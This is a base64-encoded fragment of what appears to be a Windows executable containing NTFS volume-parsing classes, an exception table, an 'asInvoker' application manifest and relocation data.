AAP7/////////AAAAAMR8AYABAAAAcDsBgAEAAAB4OwGAAQAAAAEAAAAWAAAAAgAAAAIAAAADAAAAAgAAAAQAAAAYAAAABQAAAA0AAAAGAAAACQAAAAcAAAAMAAAACAAAAAwAAAAJAAAADAAAAAoAAAAHAAAACwAAAAgAAAAMAAAAFgAAAA0AAAAWAAAADwAAAAIAAAAQAAAADQAAABEAAAASAAAAEgAAAAIAAAAhAAAADQAAADUAAAACAAAAQQAAAA0AAABDAAAAAgAAAFAAAAARAAAAUgAAAA0AAABTAAAADQAAAFcAAAAWAAAAWQAAAAsAAABsAAAADQAAAG0AAAAgAAAAcAAAABwAAAByAAAACQAAAAYAAAAWAAAAgAAAAAoAAACBAAAACgAAAIIAAAAJAAAAgwAAABYAAACEAAAADQAAAJEAAAApAAAAngAAAA0AAAChAAAAAgAAAKQAAAALAAAApwAAAA0AAAC3AAAAEQAAAM4AAAACAAAA1wAAAAsAAAAYBwAADAAAAAwAAAAIAAAA//////////+ACgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgnAYABAAAAAAAAAAAAAAAuP0FWYmFkX2V4Y2VwdGlvbkBzdGRAQAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC48wCAAQAAALjzAIABAAAAuPMAgAEAAAC48wCAAQAAALjzAIABAAAAuPMAgAEAAAC48wCAAQAAALjzAIABAAAAuPMAgAEAAAC48wCAAQAAAC4AAAAuAAAAMM8BgAEAAAAgzwGAAQAAAKzrAYABAAAArOsBgAEAAACs6wGAAQAAAKzrAYABAAAArOsBgAEAAACs6wGAAQAAAKzrAYABAAAArOsBgAEAAACs6wGAAQAAAH9/f39/f39/JM8BgAEAAACw6wGAAQAAALDrAYABAAAAsOsBgAEAAACw6wGAAQAAALDrAYABAAAAsOsBgAEAAACw6wGAAQAAAMB6AYABAAAAwnwBgAEAAAAAAAAAAAAAAADsAYABAAAAAAAAAAAAAAAA7AGAAQAAAAEBAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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BAAxjAABWYwAAFJ0BAFhjAADXYwAAPJ0BANhjAACJZAAARJ0BAKBkAAAdZQAAWJ0BADxlAACbZgAAXJ0BAJxmAADZZgAAtKcBANxmAAD8ZwAAfJ0BABBoAAC4aAAAqJ0BALhoAACXaQAArJ0BAJhpAABhagAANJ4BAGRqAACQawAAGJ4BAJBrAAAkbAAAuJ0BACRsAADFbAAAXJ4BAMhsAAAZbQAA8J0BABxtAABfbQAAnJwBAGBtAAC+bQAAQJwBAMBtAADVbQAAZJwBANhtAADtbQAAZJwBAPBtAAAibgAAnJwBACRuAAA/bgAAnJwBAEBuAABbbgAAnJwBAFxuAADRbwAAzJ0BANRvAABbcAAATJ4BAFxwAACJcAAAnJwBAKhwAADScAAAnJwBAORwAAAocQAAQJwBAChxAABhcQAAQJwBAGRxAAC+cQAAcJ4BAMBxAADncQAAnJwBAPxxAAACcwAAgJ4BAARzAABFcwAAnJwBAEhzAABecwAAnJwBAGBzAACmdAAAQJwBAKh0AADOdAAAnJwBAOB0AACPdQAAQJwBAJx1AADndQAAnJwBAOh1AAAbdgAAiJ4BABx2AABVdgAAQJwBAHB2AAAFeAAAlJ4BAAh4AABBeAAAZJwBAER4AADEeAAACKMBAMR4AAA/eQAACKMBAEB5AADCeQAACKMBAMR5AACiewAAxJ4BAKR7AADnewAAZJwBABh8AACHfgAA4J4BAKR+AAD5fgAAZJwBAAR/AABBfwAA8J8BAGB/AADHfwAACJ8BAMh/AAA0gAAADJ8BADSAAADqgAAAtKcBAOyAAAAfgQAAnJwBALSBAABKgwAAwJ8BAPCDAABlhAAALJ8BAGiEAADKhAAAQJwBAMyEAAD0hAAAZJwBAPSEAABxhQAAPJ0BAHSFAAAChgAAwJ8BAASGAADlhwAA1J8BAOiHAACiiAAATJ8BAKSIAAAAiwAAcJ8BAACLAACujQAAoJ8BALCNAAAWjgAA8J8BABiOAABhjgAA+J8BAGSOAACXjwAACKABAJiPAADUjwAAnJwBANSPAAD4jwAAnJwBAPiPAAB6kAAAQJwBAHyQAAA+kQAAPKABAECRAAC/kQAAnJwBAMCRAADkkQAAZJwBAOyRAABZkgAAcKABAFySAADNkgAAfKABAECTAACMkwAAnJwBAIyTAAAOlwAAnJw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Qcml2aWxlZ2VzPg0KICAgIDwvc2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0KPC9hc3NlbWJseT4NCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAEwBAAA4okCiSKJgomiicKJ4opCimKKgogijGKMoozijSKNYo2ijeKOIo5ijqKO4o8ij2KPoo/ijCKQYpCikOKRIpFikaKR4pIikmKSopLikyKTYpOik+KQIpRilKKU4pUilWKVopXiliKWYpailuKXIpdil6KX4pQimGKYopjimSKZYpmimeKaIppimqKa4psim2KbopvimCKcYpyinOKdIp1inaKd4p4inmKe4p8in2Kfop/inCKgYqCioOKhIqFioaKh4qIiomKioqLioyKjYqOio+KgIqRipKKk4qUipWKloqXipiKmYqaipuKnIqdip6Kn4qQiqGKooqjiqSKpYqmiqeKqIqpiqqKq4qsiq2KroqviqCKsYqyirOKtIq1iraKt4q4irmKuoq7iryKvYq+ir+KsIrBisKKw4rEisWKxorHisiKwAIAEAlAAAAPCl+KUApgimEKYYpiCmKKYwpjimQKZIplCmWKZgpmimcKZ4poCmiKaQppimoKaoprCmuKbApsim0KbYpuCm+KYApwinEKcYpyCnKKcwpzinQKdIp1CnWKdIqFCoWKioqLioyKjYqOio+KgIqRipKKk4qUipWKloqXipiKmYqaipuKnIqdip6Kn4qQiqADABABgAAAAQpBikIKQopMCsyKzQrNisAEABAPgAAACQqKCosKjAqNCo4KjwqACpEKkgqTCpQKlQqWCpcKmAqZCpoKmwqcCp0KngqfCpAKoQqiCqMKpAqlCqYKpwqoCqkKqgqrCqwKrQquCq8KoAqxCrIKswq0CrUKtgq3CrgKuQq6CrsKvAq9Cr4KvwqwCsEKwgrDCsQKxQrGCscKyArJCsoKywrMCs0KzgrPCsAK0QrSCtMK1ArVCtYK1wrYCtkK2grbCtwK3QreCt8K0ArhCuIK4wrkCuUK5grnCugK6QrqCusK7ArtCu4K7wrgCvEK8grzCvQK9Qr2CvcK+Ar5CvoK+wr8Cv0K/gr/CvAAAAUAEACAIAAACgEKAgoDCgQKBQoGCgcKCAoJCgoKCwoMCg0KDgoPCgAKEQoSChMKFAoVChYKFwoYChkKGgobChwKHQoeCh8KEAohCiIKIwokCiUKJgonCigKKQoqCisKLAotCi4KLwogCjEKMgozCjQKNQo2CjcKOAo5CjoKOwo8Cj0KPgo/CjAKQQpCCkMKRApFCkYKRwpICkkKSgpLCkwKTQpOCk8KQApRClIKUwpUClUKVgpXClgKWQpaClsKXApdCl4KXwpQCmEKYgpjCmQKZQpmCmcKaAppCmoKawpsCm2KbopvimCKcYpyinOKdIp1inaKd4p4inmKeop7inyKfYp+in+KcIqBioKKg4qEioWKhoqHioiKiYqKiouKjIqNio6Kj4qAipGKkoqTipSKlYqWipeKmIqZipqKm4qcip2KnoqfipCKoYqiiqOKpIqliqaKp4qoiqmKqoqriqyKrYquiq+KoIqxirKKs4q0irWKtoq3iriKuYq6iruKvIq9ir6Kv4qwisGKworDisSKxYrGiseKyIrJisqKy4rMis2KzorPisCK0YrSitOK1IrVitaK14rYitmK2orbityK3Yreit+K0IrhiuKK44rkiuWK5orniuiK6YrqiuuK7Irtiu6K74rgivGK8orzivSK9Yr2iveK+Ir5ivqK+4r8iv2K/or/ivAGABAKwAAAAIoBigKKA4oEigWKBooHigiKCYoKiguKDIoNig6KD4oAihGKEooTihSKFYoWiheKGIoZihqKG4ocih2KHoofihCKIYoiiiOKJIoliiaKJ4ooiimKKooriiyKLYouii+KIIoxijKKM4o0ijWKNoo3ijiKOYo6ijuKPIo9ij6KP4owikGKQopDikSKRYpGikeKSIpJikqKS4pMik2KTopPikCKUAAABwAQDMAAAAcKB4oICgiKCQoJigoKCooLCguKDAoMig0KDYoOCg6KDwoPigAKEIoRChGKEgoSihMKE4oUChSKFQoVihYKFooXCheKGAoYihkKGYoaChqKGwobihwKHIodCh2KHgoeih8KH4oQCiCKIQohiiIKIoojCiOKJAokiiUKJYomCiaKJwoniigKKIopCimKKgoqiisKK4osCiyKLQotii4KLoovCi+KIAowijEKMYoyCjKKMwozijQKNIo1CjWKNgo2ijcKN4owCAAQDMAAAA2KLgouii8KL4ogCjCKMQoxijIKMoozCjOKNAo0ijUKNYo2CjaKNwo3ijgKOIo5CjmKOgo6ijsKO4o8CjyKPQo9ij4KPoo/Cj+KMApAikEKQYpCCkKKQwpDikQKRIpFCkWKRgpGikcKR4pICkiKSQpJikoKSopLCkuKTApMik0KTYpOCk6KTwpPikAKUIpRClGKUgpSilMKU4pUClSKVQpVilYKVopXCleKWApYilkKWYpaClqKWwpbilwKXIpdCl2KU4qQDAAQAkAQAAAKAooFCgeKCgoNCgGKNQplimYKZopnCmeKaApoimkKaYpqCmqKawprimwKbIptCm2Kbgpuim8Kb4pgCnCKcQpxinIKcopzCnOKdAp0inUKdYp2CnaKdwp3ingKeIp5CnmKegp7CnuKfAp8in0KfYp+Cn6Kfwp/inAKgIqBCoGKggqCioMKg4qECoSKhQqFioYKhoqHCoeKiAqIiokKiYqKCoqKiwqLiowKjIqNCo2KjgqOio8Kj4qACpCKkQqVipeKmYqbip2KkQqiiqMKo4qkCqiKqQqpiqaKzQrtiu4K7orvCu+K4ArwivEK8YryivMK84r0CvSK9Qr1ivYK9or3CveK+Ir5CvmK+gr6ivsK+4r8CvyK/Qr+Cv8K8A0AEASAAAAKij4KMYpEikgKS4pPikMKVopaCl4KUQpjimYKaIprCm2KYApyinUKd4p6in4KcQqDioYKiAqKioyKjQqNioAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA